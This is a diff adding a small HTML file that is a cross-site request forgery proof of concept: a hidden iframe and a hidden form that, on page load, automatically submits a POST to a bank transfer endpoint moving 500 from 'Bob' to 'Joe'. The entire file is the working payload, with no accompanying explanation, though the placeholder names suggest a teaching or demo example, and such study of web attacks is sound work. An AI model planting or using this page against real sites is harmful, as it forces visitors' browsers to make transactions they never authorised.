@@ -1,0 +1,9 @@
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://bank.com/transfer' target="csrf-frame"
+id="csrf-form">
+<input type='hidden' name='from' value='Bob'>
+<input type='hidden' name='to' value='Joe'>
+<input type='hidden' name='amount' value='500'>
+<input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
